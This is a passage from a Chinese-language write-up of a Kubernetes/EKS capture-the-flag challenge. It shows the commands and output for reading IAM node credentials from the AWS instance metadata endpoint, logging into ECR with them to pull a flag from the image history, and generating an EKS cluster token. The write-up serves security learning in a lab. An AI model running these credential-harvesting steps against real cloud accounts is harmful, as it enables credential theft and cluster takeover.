class="string">&quot;2025-06-03T19:28:54Z&quot;</span>,</span><br><span class="line">                <span class="string">&quot;status&quot;</span>: <span class="string">&quot;True&quot;</span>,</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;ContainersReady&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;lastProbeTime&quot;</span>: <span class="literal">null</span>,</span><br><span class="line">                <span class="string">&quot;lastTransitionTime&quot;</span>: <span class="string">&quot;2023-11-01T13:32:10Z&quot;</span>,</span><br><span class="line">                <span class="string">&quot;status&quot;</span>: <span class="string">&quot;True&quot;</span>,</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;PodScheduled&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">&quot;containerStatuses&quot;</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;containerID&quot;</span>: <span class="string">&quot;containerd://d8eaf3d74644541191ff67a891dee0905087d6b6891d82453c62cd000cd6c441&quot;</span>,</span><br><span class="line">                <span class="string">&quot;image&quot;</span>: <span class="string">&quot;sha256:575a75bed1bdcf83fba40e82c30a7eec7bc758645830332a38cef238cd4cf0f3&quot;</span>,</span><br><span class="line">                <span class="string">&quot;imageID&quot;</span>: <span class="string">&quot;688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01&quot;</span>,</span><br><span class="line">                <span class="string">&quot;lastState&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;terminated&quot;</span>: &#123;</span><br><span class="line">                        <span class="string">&quot;containerID&quot;</span>: <span class="string">&quot;containerd://fb28c6ea08e37c19023d981c766e2b8af9eec3710b63165badac531e8d8cfb44&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;exitCode&quot;</span>: <span class="number">0</span>,</span><br><span class="line">                        <span class="string">&quot;finishedAt&quot;</span>: <span class="string">&quot;2025-06-03T19:28:53Z&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;reason&quot;</span>: <span class="string">&quot;Completed&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;startedAt&quot;</span>: <span class="string">&quot;2025-04-28T13:06:36Z&quot;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">&quot;name&quot;</span>: <span class="string">&quot;accounting-container&quot;</span>,</span><br><span class="line">                <span class="string">&quot;ready&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">                <span class="string">&quot;restartCount&quot;</span>: <span class="number">16</span>,</span><br><span class="line">                <span class="string">&quot;started&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">                <span class="string">&quot;state&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;running&quot;</span>: &#123;</span><br><span class="line">                        <span class="string">&quot;startedAt&quot;</span>: <span class="string">&quot;2025-06-03T19:28:54Z&quot;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">&quot;hostIP&quot;</span>: <span class="string">&quot;192.168.21.50&quot;</span>,</span><br><span class="line">        <span class="string">&quot;phase&quot;</span>: <span class="string">&quot;Running&quot;</span>,</span><br><span class="line">        <span class="string">&quot;podIP&quot;</span>: <span class="string">&quot;192.168.5.251&quot;</span>,</span><br><span class="line">        <span class="string">&quot;podIPs&quot;</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;ip&quot;</span>: <span class="string">&quot;192.168.5.251&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">&quot;qosClass&quot;</span>: <span class="string">&quot;BestEffort&quot;</span>,</span><br><span class="line">        <span class="string">&quot;startTime&quot;</span>: <span class="string">&quot;2023-11-01T13:32:10Z&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>OK，回到题目提示，啥是ECR？</p>
<p>ECR，全称 Elastic Container Registry，是 AWS提供的私有容器镜像仓库服务</p>
<p>镜像地址格式：<aws_account_id>.dkr.ecr.<region>.amazonaws.com&#x2F;<repository>:<tag></p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;imageID&quot;</span>: <span class="string">&quot;688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01&quot;</span></span><br></pre></td></tr></table></figure>

<p>这一题相当于第二题的升级了，因为没有给imagePullSecrets而且也没有secrets资源类的get权限了</p>
<p>然后给到的是ECR，那么就要想办法获取这玩意的凭据</p>
<p>因为这是EKS（aws提供的k8s集群托管）在AWS云上，因此尝试读取元数据</p>
<p><img src="https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/image%209qwtqwtq.png?imageSlim" alt="image.png"></p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# curl <span class="attr">http</span>:<span class="comment">//169.254.169.254/latest/meta-data/iam/security-credentials -w &#x27;\n&#x27;</span></span><br><span class="line">eks-challenge-cluster-nodegroup-<span class="title class_">NodeInstanceRole</span></span><br><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# curl <span class="attr">http</span>:<span class="comment">//169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole </span></span><br><span class="line">&#123;<span class="string">&quot;AccessKeyId&quot;</span>:<span class="string">&quot;ASIA2AVYNEVMYMFZQD3F&quot;</span>,<span class="string">&quot;Expiration&quot;</span>:<span class="string">&quot;2025-07-09 07:51:39+00:00&quot;</span>,<span class="string">&quot;SecretAccessKey&quot;</span>:<span class="string">&quot;2JmYWVY+uAQRh+QSxAsNDxB7cwEKp4mHE03vWG8J&quot;</span>,<span class="string">&quot;SessionToken&quot;</span>:<span class="string">&quot;FwoGZXIvYXdzEKj//////////wEaDJ0ZBTbRr7mSU0RA/SK3AXoefMTD437494jp100rDL1psLdMC1sEChb0tky1B51jHy7P4dVBFlsP4BJsXX0jL7tvQz1/zjfevuraaOncZWAzkCltv5VQv7DzoCfxy67hSVHb9eZt5qDU61I9YidvrMMIHypwDB/8Siq0rU7Ekq+Vx2DTZxNakh8wHz69TATx0/fsGCzHD7Ga/1RmiBs++28xzsDuM6N49SOdww8S7ys0DDs+QirlLnRo8HIG8N2OohonB1KumCj7orjDBjIt2gpkaVlYD4OjbLwNwLHiCvFZtzemHHTh205uvGR/23DFJK3RWKVT5U2RmLro&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>拿到ak sk</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">用ak sk再去用crane当做凭据登录显然是不行的</span><br><span class="line">crane auth login <span class="number">688655246681.</span>dkr.<span class="property">ecr</span>.<span class="property">us</span>-west-<span class="number">1.</span>amazonaws.<span class="property">com</span> -u <span class="title class_">ASIA2AVYNEVMVEC</span>2UXYI -p vhBR/+x6wQ3hssszPxN1aHve6MIokbGF9SxZycYG</span><br><span class="line"></span><br><span class="line">用ak sk来通过aws-cli登录ecr，因为ecr本身就是aws的云上镜像服务的实现</span><br><span class="line">rroot@wiz-eks-<span class="attr">challenge</span>:~# <span class="keyword">export</span> <span class="variable constant_">AWS_ACCESS_KEY_ID</span>=<span class="title class_">ASIA2AVYNEVMYMFZQD</span>3F</span><br><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# <span class="keyword">export</span> <span class="variable constant_">AWS_SECRET_ACCESS_KEY</span>=2JmYWVY+uAQRh+<span class="title class_">QSxAsNDxB</span>7cwEKp4mHE03vWG8J</span><br><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# <span class="keyword">export</span> <span class="variable constant_">AWS_SESSION_TOKEN</span>=<span class="title class_">FwoGZXIvYXdzEKj</span><span class="comment">//////////wEaDJ0ZBTbRr7mSU0RA/SK3AXoefMTD437494jp100rDL1psLdMC1sEChb0tky1B51jHy7P4dVBFlsP4BJsXX0jL7tvQz1/zjfevuraaOncZWAzkCltv5VQv7DzoCfxy67hSVHb9eZt5qDU61I9YidvrMMIHypwDB/8Siq0rU7Ekq+Vx2DTZxNakh8wHz69TATx0/fsGCzHD7Ga/1RmiBs++28xzsDuM6N49SOdww8S7ys0DDs+QirlLnRo8HIG8N2OohonB1KumCj7orjDBjIt2gpkaVlYD4OjbLwNwLHiCvFZtzemHHTh205uvGR/23DFJK3RWKVT5U2RmLro</span></span><br><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# aws ecr get-login-password | crane auth login <span class="number">688655246681.</span>dkr.<span class="property">ecr</span>.<span class="property">us</span>-west-<span class="number">1.</span>amazonaws.<span class="property">com</span> -u <span class="variable constant_">AWS</span> --password-stdin</span><br><span class="line"><span class="number">2025</span>/<span class="number">07</span>/<span class="number">09</span> <span class="number">07</span>:<span class="number">01</span>:<span class="number">01</span> logged <span class="keyword">in</span> via /home/user/.<span class="property">docker</span>/config.<span class="property">json</span></span><br><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# crane config <span class="number">688655246681.</span>dkr.<span class="property">ecr</span>.<span class="property">us</span>-west-<span class="number">1.</span>amazonaws.<span class="property">com</span>/central_repo-aaf4a7c@<span class="attr">sha256</span>:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01 | jq</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;architecture&quot;</span>: <span class="string">&quot;amd64&quot;</span>,</span><br><span class="line">  <span class="string">&quot;config&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;Env&quot;</span>: [</span><br><span class="line">      <span class="string">&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;Cmd&quot;</span>: [</span><br><span class="line">      <span class="string">&quot;/bin/sleep&quot;</span>,</span><br><span class="line">      <span class="string">&quot;3133337&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;ArgsEscaped&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&quot;OnBuild&quot;</span>: <span class="literal">null</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;created&quot;</span>: <span class="string">&quot;2023-11-01T13:32:07.782534085Z&quot;</span>,</span><br><span class="line">  <span class="string">&quot;history&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;created&quot;</span>: <span class="string">&quot;2023-07-18T23:19:33.538571854Z&quot;</span>,</span><br><span class="line">      <span class="string">&quot;created_by&quot;</span>: <span class="string">&quot;/bin/sh -c #(nop) ADD file:7e9002edaafd4e4579b65c8f0aaabde1aeb7fd3f8d95579f7fd3443cef785fd1 in / &quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;created&quot;</span>: <span class="string">&quot;2023-07-18T23:19:33.655005962Z&quot;</span>,</span><br><span class="line">      <span class="string">&quot;created_by&quot;</span>: <span class="string">&quot;/bin/sh -c #(nop)  CMD [\&quot;sh\&quot;]&quot;</span>,</span><br><span class="line">      <span class="string">&quot;empty_layer&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;created&quot;</span>: <span class="string">&quot;2023-11-01T13:32:07.782534085Z&quot;</span>,</span><br><span class="line">      <span class="string">&quot;created_by&quot;</span>: <span class="string">&quot;RUN sh -c #ARTIFACTORY_USERNAME=challenge@eksclustergames.com ARTIFACTORY_TOKEN=wiz_eks_challenge&#123;the_history_of_container_images_could_reveal_the_secrets_to_the_future&#125; ARTIFACTORY_REPO=base_repo /bin/sh -c pip install setuptools --index-url intrepo.eksclustergames.com # buildkit # buildkit&quot;</span>,</span><br><span class="line">      <span class="string">&quot;comment&quot;</span>: <span class="string">&quot;buildkit.dockerfile.v0&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;created&quot;</span>: <span class="string">&quot;2023-11-01T13:32:07.782534085Z&quot;</span>,</span><br><span class="line">      <span class="string">&quot;created_by&quot;</span>: <span class="string">&quot;CMD [\&quot;/bin/sleep\&quot; \&quot;3133337\&quot;]&quot;</span>,</span><br><span class="line">      <span class="string">&quot;comment&quot;</span>: <span class="string">&quot;buildkit.dockerfile.v0&quot;</span>,</span><br><span class="line">      <span class="string">&quot;empty_layer&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="string">&quot;os&quot;</span>: <span class="string">&quot;linux&quot;</span>,</span><br><span class="line">  <span class="string">&quot;rootfs&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;layers&quot;</span>,</span><br><span class="line">    <span class="string">&quot;diff_ids&quot;</span>: [</span><br><span class="line">      <span class="string">&quot;sha256:3d24ee258efc3bfe4066a1a9fb83febf6dc0b1548dfe896161533668281c9f4f&quot;</span>,</span><br><span class="line">      <span class="string">&quot;sha256:9057b2e37673dc3d5c78e0c3c5c39d5d0a4cf5b47663a4f50f5c6d56d8fd6ad5&quot;</span></span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# </span><br></pre></td></tr></table></figure>

<h1 id="Pod-Break"><a href="#Pod-Break" class="headerlink" title="Pod Break"></a>Pod Break</h1><p>这一关其实更偏向于公有云攻防到k8s集群接管（这里是AWS的EKS），考察的也就是EKS的一些后渗透利用技巧</p>
<p><img src="https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/image%2010qwtqw.png?imageSlim" alt="image.png"></p>
<p>没有pod和secrets权限了</p>
<p>这部分中的集群内，我们是一个没有任何权限的服务账号。所以 kubectl 基本无用了</p>
<p>但是这一层解锁了 AWS 凭据。 </p>
<p>再看描述，说明需要提权到被限制的 k8s node 节点权限 (EKS层面)）</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# kubectl auth can-i --list</span><br><span class="line"><span class="attr">warning</span>: the list may be <span class="attr">incomplete</span>: webhook authorizer does not support user rule resolution</span><br><span class="line"><span class="title class_">Resources</span>                                       <span class="title class_">Non</span>-<span class="title class_">Resource</span> <span class="title class_">URLs</span>                     <span class="title class_">Resource</span> <span class="title class_">Names</span>     <span class="title class_">Verbs</span></span><br><span class="line">selfsubjectaccessreviews.<span class="property">authorization</span>.<span class="property">k8s</span>.<span class="property">io</span>   []                                    []                 [create]</span><br><span class="line">selfsubjectrulesreviews.<span class="property">authorization</span>.<span class="property">k8s</span>.<span class="property">io</span>    []                                    []                 [create]</span><br><span class="line">                                                [<span class="regexp">/.well-known/</span>openid-configuration]   []                 [get]</span><br><span class="line">                                                [<span class="regexp">/api/</span>*]                              []                 [get]</span><br><span class="line">                                                [/api]                                []                 [get]</span><br><span class="line">                                                [<span class="regexp">/apis/</span>*]                             []                 [get]</span><br><span class="line">                                                [/apis]                               []                 [get]</span><br><span class="line">                                                [/healthz]                            []                 [get]</span><br><span class="line">                                                [/healthz]                            []                 [get]</span><br><span class="line">                                                [/livez]                              []                 [get]</span><br><span class="line">                                                [/livez]                              []                 [get]</span><br><span class="line">                                                [<span class="regexp">/openapi/</span>*]                          []                 [get]</span><br><span class="line">                                                [/openapi]                            []                 [get]</span><br><span class="line">                                                [<span class="regexp">/openid/</span>v1/jwks]                     []                 [get]</span><br><span class="line">                                                [/readyz]                             []                 [get]</span><br><span class="line">                                                [/readyz]                             []                 [get]</span><br><span class="line">                                                [<span class="regexp">/version/</span>]                           []                 [get]</span><br><span class="line">                                                [<span class="regexp">/version/</span>]                           []                 [get]</span><br><span class="line">                                                [/version]                            []                 [get]</span><br><span class="line">                                                [/version]                            []                 [get]</span><br><span class="line">podsecuritypolicies.<span class="property">policy</span>                      []                                    [eks.<span class="property">privileged</span>]   [use]</span><br></pre></td></tr></table></figure>

<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# aws sts get-caller-identity</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;UserId&quot;</span>: <span class="string">&quot;AROA2AVYNEVMQ3Z5GHZHS:i-0cb922c6673973282&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Account&quot;</span>: <span class="string">&quot;688655246681&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Arn&quot;</span>: <span class="string">&quot;arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析一下arn的格式可以获取到很多信息</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">arn</span>:<span class="attr">partition</span>:<span class="attr">service</span>:<span class="attr">region</span>:account-<span class="attr">id</span>:resource-type/resource-id</span><br><span class="line"><span class="attr">arn</span>:<span class="attr">aws</span>:<span class="attr">sts</span>::<span class="number">688655246681</span>:assumed-role/eks-challenge-cluster-nodegroup-<span class="title class_">NodeInstanceRole</span>/i-0cb922c6673973282</span><br><span class="line"></span><br><span class="line">这里region为空</span><br><span class="line"><span class="attr">partition</span>: aws</span><br><span class="line"><span class="attr">service</span>: sts</span><br><span class="line"><span class="attr">region</span>:</span><br><span class="line">account-<span class="attr">id</span>: <span class="number">688655246681</span></span><br><span class="line">resource-<span class="attr">type</span>: assumed-role</span><br><span class="line">resource-<span class="attr">id</span>: eks-challenge-cluster-nodegroup-<span class="title class_">NodeInstanceRole</span>/i-0cb922c6673973282</span><br><span class="line"></span><br><span class="line">cluster-<span class="attr">name</span>: eks-challenge-cluster</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>aws eks help 看看有哪些cli的命令可以用</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">       eks -</span><br><span class="line"></span><br><span class="line"><span class="variable constant_">DESCRIPTION</span></span><br><span class="line">       <span class="title class_">Amazon</span>  <span class="title class_">Elastic</span>  <span class="title class_">Kubernetes</span>  <span class="title class_">Service</span>  (<span class="title class_">Amazon</span> <span class="variable constant_">EKS</span>) is a managed service</span><br><span class="line">       that makes it easy <span class="keyword">for</span> you to run <span class="title class_">Kubernetes</span>  on  <span class="title class_">Amazon</span>  <span class="title class_">Web</span>  <span class="title class_">Services</span></span><br><span class="line">       without  needing  to  stand  up or maintain your own <span class="title class_">Kubernetes</span> control</span><br><span class="line">       plane. <span class="title class_">Kubernetes</span> is an open-source system <span class="keyword">for</span> automating  the  deploy-</span><br><span class="line">       ment, scaling, and management <span class="keyword">of</span> containerized applications.</span><br><span class="line"></span><br><span class="line">       <span class="title class_">Amazon</span> <span class="variable constant_">EKS</span> runs up-to-date versions <span class="keyword">of</span> the open-source <span class="title class_">Kubernetes</span> soft-</span><br><span class="line">       ware, so you can use all the existing plugins and tooling <span class="keyword">from</span> the  <span class="title class_">Ku</span>-</span><br><span class="line">       bernetes  community.  <span class="title class_">Applications</span> running on <span class="title class_">Amazon</span> <span class="variable constant_">EKS</span> are fully com-</span><br><span class="line">       patible <span class="keyword">with</span> applications running on any standard  <span class="title class_">Kubernetes</span>  environ-</span><br><span class="line">       ment,  whether  running  <span class="keyword">in</span>  on-premises data centers or public clouds.</span><br><span class="line">       <span class="title class_">This</span> means that you can easily migrate any standard <span class="title class_">Kubernetes</span> applica-</span><br><span class="line">       tion to <span class="title class_">Amazon</span> <span class="variable constant_">EKS</span> without any code modification required.</span><br><span class="line"></span><br><span class="line"><span class="variable constant_">AVAILABLE</span> <span class="variable constant_">COMMANDS</span></span><br><span class="line">       o associate-encryption-config</span><br><span class="line"></span><br><span class="line">       o associate-identity-provider-config</span><br><span class="line"></span><br><span class="line">       o create-addon</span><br><span class="line"></span><br><span class="line">       o create-cluster</span><br><span class="line"></span><br><span class="line">       o create-fargate-profile</span><br><span class="line"></span><br><span class="line">       o create-nodegroup</span><br><span class="line"></span><br><span class="line">       o <span class="keyword">delete</span>-addon</span><br><span class="line"></span><br><span class="line">       o <span class="keyword">delete</span>-cluster</span><br><span class="line"></span><br><span class="line">       o <span class="keyword">delete</span>-fargate-profile</span><br><span class="line"></span><br><span class="line">       o <span class="keyword">delete</span>-nodegroup</span><br><span class="line"></span><br><span class="line">       o deregister-cluster</span><br><span class="line"></span><br><span class="line">       o describe-addon</span><br><span class="line">       </span><br><span class="line">       o describe-addon-configuration</span><br><span class="line"></span><br><span class="line">       o describe-addon-versions</span><br><span class="line"></span><br><span class="line">       o describe-cluster</span><br><span class="line"></span><br><span class="line">       o describe-fargate-profile</span><br><span class="line"></span><br><span class="line">       o describe-identity-provider-config</span><br><span class="line"></span><br><span class="line">       o describe-nodegroup</span><br><span class="line"></span><br><span class="line">       o describe-update</span><br><span class="line"></span><br><span class="line">       o disassociate-identity-provider-config</span><br><span class="line"></span><br><span class="line">       o get-token</span><br><span class="line"></span><br><span class="line">       o help</span><br><span class="line"></span><br><span class="line">       o list-addons</span><br><span class="line"></span><br><span class="line">       o list-clusters</span><br><span class="line"></span><br><span class="line">       o list-fargate-profiles</span><br><span class="line"></span><br><span class="line">       o list-identity-provider-configs</span><br><span class="line"></span><br><span class="line">       o list-nodegroups</span><br><span class="line"></span><br><span class="line">       o list-tags-<span class="keyword">for</span>-resource</span><br><span class="line"></span><br><span class="line">       o list-updates</span><br><span class="line"></span><br><span class="line">       o register-cluster</span><br><span class="line"></span><br><span class="line">       o tag-resource</span><br><span class="line"></span><br><span class="line">       o untag-resource</span><br><span class="line"></span><br><span class="line">       o update-cluster-config</span><br><span class="line"></span><br><span class="line">       o update-cluster-version</span><br><span class="line"></span><br><span class="line">       o update-kubeconfig</span><br><span class="line"></span><br><span class="line">       o update-nodegroup-config</span><br><span class="line"></span><br><span class="line">       o update-nodegroup-version</span><br><span class="line"></span><br><span class="line">       o wait</span><br></pre></td></tr></table></figure>

<p>这里有个这个参数get-token可以生成token</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# aws eks get-token --cluster-name eks-challenge-cluster</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;kind&quot;</span>: <span class="string">&quot;ExecCredential&quot;</span>,</span><br><span class="line">    <span class="string">&quot;apiVersion&quot;</span>: <span class="string">&quot;client.authentication.k8s.io/v1beta1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;spec&quot;</span>: &#123;&#125;,</span><br><span class="line">    <span class="string">&quot;status&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;expirationTimestamp&quot;</span>: <span class="string">&quot;2025-07-09T08:19:43Z&quot;</span>,</span><br><span class="line">        <span class="string">&quot;token&quot;</span>: <span 